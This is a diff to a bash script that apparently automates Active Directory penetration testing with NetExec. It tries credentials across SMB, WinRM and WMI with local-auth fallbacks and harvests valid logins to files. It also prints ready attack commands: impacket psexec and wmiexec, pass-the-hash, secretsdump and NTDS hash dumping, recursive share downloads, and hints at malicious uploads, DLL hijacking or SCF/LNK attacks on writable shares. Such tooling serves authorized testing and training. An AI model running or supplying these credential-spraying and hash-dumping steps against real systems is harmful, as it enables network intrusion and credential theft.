@@ -7,28 +7,29 @@ pass=""
 domain=""
 hash=""
 os_type=""  # Will be auto-detected if not specified
+ANON_RUN="false"
 
 # --- Color Definitions & ADHD Friendly Output ---
-NC='\033[0m'
-BOLD='\033[1m'
-UNDERLINE='\033[4m'
-BLACK='\033[0;30m'
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
-MAGENTA='\033[0;35m'
-CYAN='\033[0;36m'
-WHITE='\033[0;37m'
+NC=$'\033[0m'
+BOLD=$'\033[1m'
+UNDERLINE=$'\033[4m'
+BLACK=$'\033[0;30m'
+RED=$'\033[0;31m'
+GREEN=$'\033[0;32m'
+YELLOW=$'\033[0;33m'
+BLUE=$'\033[0;34m'
+MAGENTA=$'\033[0;35m'
+CYAN=$'\033[0;36m'
+WHITE=$'\033[0;37m'
 
 # Bright Colors
-BRED='\033[1;31m'
-BGREEN='\033[1;32m'
-BYELLOW='\033[1;33m'
-BBLUE='\033[1;34m'
-BMAGENTA='\033[1;35m'
-BCYAN='\033[1;36m'
-BWHITE='\033[1;37m'
+BRED=$'\033[1;31m'
+BGREEN=$'\033[1;32m'
+BYELLOW=$'\033[1;33m'
+BBLUE=$'\033[1;34m'
+BMAGENTA=$'\033[1;35m'
+BCYAN=$'\033[1;36m'
+BWHITE=$'\033[1;37m'
 
 # Standardized Logging Functions
 log_info() {
@@ -333,329 +334,7 @@ promote_verified_creds() {
 }
 
 # Helper function to run nxc and suggest login command if successful
-check_and_suggest() {
-    service=$1
-    shift
-    log_info "Checking $service..."
-    # Print the command before execution
-    print_cmd "$@"
-    # Run the command and capture output
-    output=$("$@")
-
-    echo "$output"
-    
-    # Auto-fix Schema Mismatch and Retry
-    if echo "$output" | grep -q "Schema mismatch detected"; then
-        log_warning "Schema mismatch detected! Attempting auto-fix (deleting old DBs) and RETRYING..."
-        rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
-        rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
-        
-        log_info "Retrying command..."
-        # Retry the command
-        print_cmd "$@"
-        output=$("$@")
-        echo "$output"
-    fi
-
-    # Try different auth combinations if failed for SMB/WinRM/WMI
-    if [[ "$service" == "smb" || "$service" == "winrm" || "$service" == "wmi" ]] && ! echo "$output" | grep -q "+"; then
-         
-         # Helper to strip domain for retries
-         local base_args=()
-         local skip_next=false
-         for arg in "$@"; do
-             if [ "$skip_next" = true ]; then skip_next=false; continue; fi
-             if [ "$arg" = "-d" ]; then skip_next=true; continue; fi
-             base_args+=("$arg")
-         done
-
-         # 1. Try WITHOUT domain flag if one was provided
-         if [[ "$*" == *"-d "* ]]; then
-             log_warning "Auth failed with domain. Retrying WITHOUT domain flag..."
-             print_cmd "${base_args[@]}"
-             output=$("${base_args[@]}")
-             echo "$output"
-         fi
-
-         # 2. Try with --local-auth if still failed
-         if ! echo "$output" | grep -q "+"; then
-             log_warning "Still failed. Retrying with --local-auth (stripping domain)..."
-             print_cmd "${base_args[@]} --local-auth"
-             output=$("${base_args[@]}" --local-auth)
-             echo "$output"
-             
-             # If local auth worked, we should remember to use it for future suggestions in this session
-             if echo "$output" | grep -q "+"; then
-                 USE_LOCAL_AUTH="true"
-             fi
-         fi
-    fi
-    
-    # Harvest any successes found in this tool's output
-    echo "$output" | grep -a "\[+\]" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
-        local cred=$(echo "$line" | sed 's/.*\[+\] //')
-        if [ -n "$cred" ]; then
-            if ! grep -qxF "$cred" "$VALID_CREDS_FILE" 2>/dev/null; then
-                echo "$cred" >> "$VALID_CREDS_FILE"
-            fi
-        fi
-    done
-
-    # Harvest password change required
-    echo "$output" | grep -a "STATUS_PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
-        local cred=$(echo "$line" | sed 's/.*[-] //' | cut -d' ' -f1)
-        if [ -n "$cred" ]; then
-            if ! grep -qxF "$cred" "$POTENTIAL_CREDS_FILE" 2>/dev/null; then
-                echo "$cred (PASSWORD_MUST_CHANGE)" >> "$POTENTIAL_CREDS_FILE"
-            fi
-        fi
-    done
-    
-    # Check for success indicator "[+]"
-    if echo "$output" | grep -q "+"; then
-        # If user is a file (list), sanitizing to just 'USER' for display purposes in suggestions
-        # The true username will be available if auto-promotion runs, but here we just want a clean string
-        display_user="$user"
-        if [ -f "$user" ]; then
-             display_user="USER"
-        fi
-
-        log_success "Valid credentials for $service! Suggested command:"
-
-        
-        # Prepare credential strings
-        if [ -n "$domain" ] && [ "$USE_LOCAL_AUTH" != "true" ]; then
-             display_user_winrm="$domain\\$display_user"
-        else
-             display_user_winrm="$display_user"
-        fi
-
-        if [ -n "$hash" ]; then
-            IMPACKET_CREDS="$domain/$display_user@$IP -hashes :$hash"
-            WINRM_CREDS="-i $IP -u '$display_user_winrm' -H '$hash'"
-            if [ -n "$domain" ]; then
-                SMBCLIENT_AUTH="-U '$domain\\$display_user' --pw-nt-hash $hash"
-                SMBGET_USER="$domain/$display_user%$hash"
-                SMBMAP_CREDS="-u '$display_user' -p '$hash' -d '$domain'"
-            else
-                SMBCLIENT_AUTH="-U '$display_user' --pw-nt-hash $hash"
-                SMBGET_USER="$display_user%$hash"
-                SMBMAP_CREDS="-u '$display_user' -p '$hash'"
-            fi
-            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
-        else
-            IMPACKET_CREDS="$domain/$display_user:$pass@$IP"
-            WINRM_CREDS="-i $IP -u '$display_user_winrm' -p '$pass'"
-            if [ -n "$domain" ]; then
-                SMBCLIENT_AUTH="-U '$domain\\$display_user%$pass'"
-                SMBGET_USER="$domain/$display_user%$pass"
-                SMBMAP_CREDS="-u '$display_user' -p '$pass' -d '$domain'"
-            else
-                SMBCLIENT_AUTH="-U '$display_user%$pass'"
-                SMBGET_USER="$display_user%$pass"
-                SMBMAP_CREDS="-u '$display_user' -p '$pass'"
-            fi
-            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
-        fi
-
-        case $service in
-            "smb")
-                # Suggest Impacket tools for SMB
-                log_warning "Impacket tools for SMB:"
-                echo "impacket-psexec $IMPACKET_CREDS"
-                echo "impacket-smbexec $IMPACKET_CREDS"
-                
-                # Check for Admin access (Pwn3d!)
-                if echo "$output" | grep -q "Pwn3d!"; then
-                     log_success "Admin access (Pwn3d!) detected - tools above will work!"
-                else
-                     log_error "Note: Admin tools above require elevated privileges"
-                fi
-                echo ""
-
-                # Enumerate shares to see which ones are accessible
-                log_info "Enumerating shares for suggestions..."
-                # Use the already captured output if it contains shares, or run it if needed.
-                # Since we are optimizing to run --shares in the main call, we use $output.
-                shares_output="$output"
-                
-                # Check for writable shares and display prominent notice
-                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i ~ /WRITE/) {print $(i-1); next}}' | sed 's/^\\\//')
-                if [ -n "$writable_shares" ]; then
-                    log_error "WRITABLE SHARES FOUND - Potential for privilege escalation!"
-                    log_warning "Writable shares for user '${display_user}':"
-                    echo "$shares_output" | while read -r line; do
-                        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
-                        if [[ "$clean_line" == *"WRITE"* ]]; then
-                            share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ,WRITE|WRITE)$/) {print $(i-1); exit}}')
-                            share=${share#\\}
-                            if [ ! -z "$share" ]; then
-                                echo -e "  - ${BRED}$share${NC}"
-                                log_info "Upload file to $share:"
-                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'put local_file.txt remote_file.txt'"
-                            fi
-                        fi
-                    done
-                    echo ""
-                    log_success "Exploitation suggestions:"
-                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
-                    echo "# Check for startup folders, scripts, or scheduled tasks"
-                    echo ""
-                fi
-                
-                log_success "Suggested connections:"
-                echo "$shares_output" | while read -r line; do
-                    # Clean color codes for parsing
-                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
-                    
-                    # Check for accessible shares (READ or WRITE)
-                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
-                        # Extract share name (it is the field before READ or WRITE)
-                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
-                        
-                        # Remove leading backslash if present
-                        share=${share#\\}
-                        
-                        if [ ! -z "$share" ]; then
-                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
-                        fi
-                    fi
-                done
-                
-                # Add recursive download suggestions
-                echo ""
-                log_success "Download all files from shares:"
-                echo "$shares_output" | while read -r line; do
-                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
-                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
-                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
-                        share=${share#\\}
-                        if [ ! -z "$share" ]; then
-                            log_info "Download $share recursively:"
-                            if [ -n "$hash" ]; then
-                                echo "# Recursively download all files (Best way):"
-                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
-                                echo ""
-                                echo "# Download specific file with smbmap:"
-                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
-                                echo "# Note: smbget doesn't support --pw-nt-hash"
-                            else
-                                echo "# Recursively download all files (Best ways):"
-                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
-                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
-                                echo ""
-                                echo "# Download specific file with smbmap:"
-                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
-                            fi
-                            echo ""
-                        fi
-                    fi
-                done
-                
-                # Add remote execution tool suggestions
-                log_success "Remote execution tools:"
-                if echo "$output" | grep -q "Pwn3d!"; then
-                    log_info "Admin access detected - these tools should work:"
-                    echo "impacket-wmiexec $IMPACKET_CREDS  # (or wmiexec.py)"
-                    echo "impacket-psexec $IMPACKET_CREDS   # (or psexec.py)"
-                    echo "impacket-smbexec $IMPACKET_CREDS  # (or smbexec.py)"
-                    echo "impacket-atexec $IMPACKET_CREDS   # (or atexec.py)"
-                else
-                    log_warning "No admin access - these tools may fail:"
-                    echo "impacket-wmiexec $IMPACKET_CREDS  # Requires admin (or wmiexec.py)"
-                    echo "impacket-psexec $IMPACKET_CREDS   # Requires admin (or psexec.py)"
-                fi
-                ;;
-            "wmi")
-                if echo "$output" | grep -q "Pwn3d!"; then
-                     log_success "Admin access (Pwn3d!) detected - impacket-wmiexec should work!"
-                else
-                     log_warning "Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied)."
-                fi
-                echo "impacket-wmiexec $IMPACKET_CREDS"
-                ;;
-            "winrm")
-                log_success "WinRM Shell access! Suggested shell tool:"
-                echo "evil-winrm $WINRM_CREDS"
-                if [ "$USE_LOCAL_AUTH" = "true" ]; then
-                     log_info "Note: Successful login was found to be a local account."
-                fi
-                echo ""
-                log_info "Or execute command with NetExec:"
-                if [ "$USE_LOCAL_AUTH" = "true" ]; then
-                     echo "nxc winrm $IP $USER_FLAG --local-auth -x whoami"
-                else
-                     echo "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
-                fi
-                ;;
-            "mssql")
-                echo "impacket-mssqlclient $IMPACKET_CREDS"
-                ;;
-            "ssh")
-                echo "ssh '$display_user@$IP'"
-                ;;
-            "ftp")
-                echo "ftp ftp://$display_user:$pass@$IP"
-                ;;
-            "vnc")
-                echo "vncviewer $IP"
-                ;;
-            "ldap")
-                # LDAP enumeration tools
-                log_section "LDAP Enumeration Tools"
-                
-                # Check for Admin access (Pwn3d!)
-                if echo "$output" | grep -q "Pwn3d!"; then
-                    log_error "Domain Admin access (Pwn3d!) detected! You can dump NTDS hashes."
-                    log_success "Suggested exploitation commands:"
-                    echo "nxc smb $IP $USER_FLAG --ntds"
-                    echo "impacket-secretsdump $IMPACKET_CREDS"
-                    echo ""
-                fi
-
-                if [ -n "$domain" ]; then
-                    base_dn="DC=${domain//./,DC=}"
-                    if [ -n "$hash" ]; then
-                        log_info "NetExec LDAP enumeration:"
-                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --users"
-                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --bloodhound -c All"
-                        echo ""
-                        log_info "ldapdomaindump (requires password, not hash):"
-                        echo "# ldapdomaindump -u '$domain\\$display_user' -p 'PASSWORD' ldap://$IP"
-                    else
-                        log_info "ldapsearch:"
-                        echo "ldapsearch -x -H ldap://$IP -D \"$display_user@$domain\" -w '$pass' -b \"$base_dn\" \"(objectClass=*)\""
-                        echo ""
-                        log_info "ldapdomaindump:"
-                        echo "ldapdomaindump -u '$domain\\$display_user' -p '$pass' ldap://$IP"
-                        echo ""
-                        log_info "BloodHound data collection:"
-                        echo "bloodhound-python -u '$display_user' -p '$pass' -d $domain -ns $IP -c All"
-                        echo ""
-                        log_info "NetExec LDAP enumeration:"
-                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -p '$pass' --users --bloodhound -c All"
-                    fi
-                else
-                    log_warning "Domain name required for LDAP tools. Specify with -d flag"
-                fi
-                ;;
-        esac
-        
-        # RDP specific
-        if [ "$service" == "rdp" ]; then
-            if [ -n "$domain" ]; then
-                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /d:'$domain' /dynamic-resolution +clipboard /cert:ignore"
-                 echo "rdesktop -u '$display_user' -p '$pass' -d '$domain' $IP"
-            else
-                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /dynamic-resolution +clipboard /cert:ignore"
-                 echo "rdesktop -u '$display_user' -p '$pass' $IP"
-            fi
-            echo "remmina -c rdp://$display_user:$pass@$IP"
-        fi
-        echo ""
-    fi
-}
-
+# Redundant definition removed. See second definition later in the script.
 
 # Function to auto-detect the target OS and Domain info
 detect_target_info() {
@@ -1182,11 +861,12 @@ else
 fi
 
 run_anonymous_enumeration() {
-# Skip Windows-specific anonymous/guest enumeration for Linux
-if [ "$os_type" = "windows" ]; then
-    # Guest access (domain optional)
-    log_section "SMB Guest Access"
-    if [ -n "$domain" ]; then
+    ANON_RUN="true"
+    # Skip Windows-specific anonymous/guest enumeration for Linux
+    if [ "$os_type" = "windows" ]; then
+        # Guest access (domain optional)
+        log_section "SMB Guest Access"
+        if [ -n "$domain" ]; then
         print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --shares"
         guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
     else
@@ -2136,26 +1816,21 @@ check_and_suggest() {
                 fi
 
                 if [ -n "$domain" ]; then
-                    base_dn="DC=${domain//./,DC=}"
+                    local base_dn="DC=${domain//./,DC=}"
+                    
                     if [ -n "$hash" ]; then
                         log_info "NetExec LDAP enumeration:"
-                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -H '$hash' --users"
-                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -H '$hash' --bloodhound -c All"
+                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --users"
+                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --bloodhound -c All"
                         echo ""
                         log_info "ldapdomaindump (requires password, not hash):"
                         echo "# ldapdomaindump -u '$domain\\$display_user' -p 'PASSWORD' ldap://$IP"
                     else
-                        log_info "ldapsearch:"
-                        echo "ldapsearch -x -H ldap://$IP -D \"$display_user@$domain\" -w '$pass' -b \"$base_dn\" \"(objectClass=*)\""
-                        echo ""
-                        log_info "ldapdomaindump:"
-                        echo "ldapdomaindump -u '$domain\\$display_user' -p '$pass' ldap://$IP"
-                        echo ""
-                        log_info "BloodHound data collection:"
-                        echo "bloodhound-python -u '$display_user' -p '$pass' -d $domain -ns $IP -c All"
-                        echo ""
-                        log_info "NetExec LDAP enumeration:"
-                        echo "nxc ldap $IP -d '$domain' -u '$display_user' -p '$pass' --users --bloodhound -c All"
+                        log_info "Suggested LDAP Commands:"
+                        printf "  - ldapsearch:         ldapsearch -x -H ldap://%s -D \"%s@%s\" -w '%s' -b \"%s\" \"(objectClass=*)\"\n" "$IP" "$display_user" "$domain" "$pass" "$base_dn"
+                        printf "  - ldapdomaindump:     ldapdomaindump -u '%s\\%s' -p '%s' ldap://%s\n" "$domain" "$display_user" "$pass" "$IP"
+                        printf "  - BloodHound:         bloodhound-python -u '%s' -p '%s' -d %s -ns %s -c All\n" "$display_user" "$pass" "$domain" "$IP"
+                        printf "  - NetExec:            nxc ldap %s %s -u '%s' -p '%s' --users --bloodhound -c All\n" "$IP" "$DOMAIN_FLAG" "$display_user" "$pass"
                     fi
                 else
                     log_warning "Domain name required for LDAP tools. Specify with -d flag"
@@ -2924,6 +2599,20 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ]; then
     else
         log_info "NTDS dump skipped (timed out or declined)"
         log_info "To run manually: ${BWHITE}nxc smb $IP $USER_FLAG --ntds${NC}"
+    fi
+fi
+
+# Ask to run anonymous enumeration if credentials were provided
+if [ -n "$user" ] && [ "$ANON_RUN" = "false" ]; then
+    echo ""
+    log_section "Anonymous / Guest Enumeration"
+    echo -e "${BYELLOW}❓ Do you want to continue on anonymous / guest mode?${NC}"
+    read -p "   [y/N]: " run_anon_choice
+    echo ""
+    if [[ "$run_anon_choice" =~ ^[Yy]$ ]]; then
+        run_anonymous_enumeration
+    else
+        log_info "Skipping anonymous / guest enumeration."
     fi
 fi
 
